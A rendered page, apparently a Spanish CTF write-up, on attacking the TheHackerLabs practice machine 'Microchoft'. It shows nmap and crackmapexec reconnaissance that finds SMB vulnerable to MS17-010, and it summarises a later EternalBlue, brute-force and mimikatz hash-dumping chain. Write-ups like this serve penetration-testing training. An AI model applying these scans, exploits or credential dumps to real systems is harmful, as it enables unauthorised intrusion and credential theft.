@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Microchoft - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-microchoft/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Microchoft - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-microchoft/microchoft.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/PentestNotes/">
+          <span class="side-post-card-title">Notas de Pentesting</span>
+          
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-ensalaPapas/">
+          <span class="side-post-card-title">Ensalá Papas </span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Microchoft</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/vulnhub-wirteup-fawkes/">
+          <span class="side-post-card-title">Fawkes</span>
+          <span class="side-post-card-platform">VulnHub</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/vulnhub-writeup-nagini/">
+          <span class="side-post-card-title">Nagini</span>
+          <span class="side-post-card-platform">VulnHub</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Microchoft - TheHackerLabs</h1>
+    <div class="post-meta">20 November 2024 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-microchoft/microchoft.jpg" alt="Microchoft - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina bastante sencilla. Después de aplicar un descubrimiento de hosts, identificamos nuestro objetivo y comenzamos las pruebas de penetración. Se identifica que el servicio SMB es vulnerable al ataque Eternal Blue, por lo que se hacen distintas pruebas para aplicar este ataque, siendo que únicamente se pudo aplicar con la herramienta Metasploit Framework. Además, se hace un ataque de fuerza bruta con crackmapexec para obtener las contraseñas de los usuarios registrados, pero no fue exitoso. Una vez que obtenemos la sesión de meterpreter, podemos cargar el módulo Kiwi que nos permite usar mimikatz para obtener las contraseñas y hashes NTLM de los usuarios. Por último, buscamos y leemos el archivo Unattend.xml en busca de la contraseña del usuario Administrador, pero no estaba en el archivo, por lo que damos por concluida la máquina.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>crackmapexec</code></li><li><code>python</code></li><li><code>metasploit framework (msfconsole)</code></li><li><code>meterpreter</code></li><li><code>Módulo: exploit/windows/smb/ms17_010_eternalblue</code></li><li><code>Módulo: Kiwi (Mimikatz)</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SMB">Analizando Servicio SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#eternalBlue">Aplicando Ataque Eternal Blue (MS17-010) con Metasploit Framework</a></li>
+        <li><a href="#Crackmapexec">Aplicando Fuerza Bruta a Servicio SMB con crackmapexec</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Hashes">Obteniendo Hashes NTLM con Módulo Kiwi de Meterpreter</a></li>
+        <li><a href="#Unattend">Buscando y Leyendo Archivo Unattend.xml</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SMB">Analizando Servicio SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#eternalBlue">Aplicando Ataque Eternal Blue (MS17-010) con Metasploit Framework</a></li>
+        <li><a href="#Crackmapexec">Aplicando Fuerza Bruta a Servicio SMB con crackmapexec</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Hashes">Obteniendo Hashes NTLM con Módulo Kiwi de Meterpreter</a></li>
+        <li><a href="#Unattend">Buscando y Leyendo Archivo Unattend.xml</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00045s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: 03:00:01:1G:22:09 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Lo encontramos con la siguiente IP: <code>192.168.1.10</code>.</p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>PING 192.168.1.10 <span style="color:#f92672">(</span>192.168.1.10<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.46 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.709 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.649 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.10: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.684 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.1.10 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3073ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.649/0.874/1.457/0.336 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.1.10 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-20 14:04 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 14:04
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.10 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 14:04, 0.05s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 14:04
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.10 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 49155/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 49154/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 49152/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 49153/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Discovered open port 49157/tcp on 192.168.1.10
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 14:05, 37.54s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00063s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2024-11-20 14:04:27 CST <span style="color:#66d9ef">for</span> 38s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">52142</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">13385</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      REASON
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: 03:00:01:1G:22:09 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 37.75 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">136591</span> <span style="color:#f92672">(</span>6.010MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">52156</span> <span style="color:#f92672">(</span>2.086MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo que solamente hay 3 puertos abiertos. Me parece que la intrusión será por el <strong>servicio SMB</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 135,139,445,49152,49153,49154,49155,49157 192.168.1.10 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-20 14:07 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0058s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: 03:00:01:1G:22:09 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: MICROCHOFT; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-11-20T20:08:56
+</span></span><span style="display:flex;"><span>|_  start_date: 2024-11-20T12:47:36
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2:1:0: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -19m58s, deviation: 34m38s, median: 1s
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: MICROCHOFT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 03:00:01:1G:22:09 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Home Basic 6.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+</span></span><span style="display:flex;"><span>|   Computer name: Microchoft
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: MICROCHOFT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2024-11-20T21:08:56+01:00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 65.70 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece que el escaneo nos mostró el SO de la máquina e información del <strong>servicio SMB</strong>. Parece que sí es la única vía para atacar la máquina.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="SMB">Analizando Servicio SMB</h3>
+<p>Podríamos probar a tratar de enumerar el <strong>servicio SMB</strong>, pero el escaneo nos mostró que es necesario contar con credenciales válidas.</p>
+<p>Aun así, podemos obtener algo de información con scripts de <strong>nmap</strong> y con <strong>crackmapexec</strong>.</p>
+<p>Usemos primero <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.10
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>  MICROCHOFT  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>name:MICROCHOFT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Microchoft<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Confirmamos el SO que usa la máquina y obtenemos el nombre del host.</p>
+<p>Ahora con <strong>nmap</strong>, vamos a aplicar scripts que sean seguros y muestren vulnerabilidades para el <strong>servicio SMB</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script <span style="color:#e6db74">&#34;vuln and safe&#34;</span> -p <span style="color:#ae81ff">445</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-20 14:12 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.10
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00065s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>MAC Address: 03:00:01:1G:22:09 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-vuln-ms17-010: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2017-0143
+</span></span><span style="display:flex;"><span>|     Risk factor: HIGH
+</span></span><span style="display:flex;"><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span style="display:flex;"><span>|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2017-03-14
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+</span></span><span style="display:flex;"><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span style="display:flex;"><span>|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.40 seconds
+</span></span></code></pre></div><p>Excelente, parece que es vulnerable al <strong>ataque Eternal Blue</strong>, que ya hemos explotado en la <strong>máquina Blue</strong> de <strong>HTB</strong>.</p>
+<p>Igual podemos usar el script específico que identifica si un <strong>servicio SMB</strong> es vulnerable al <strong>Eternal Blue</strong>:</p>
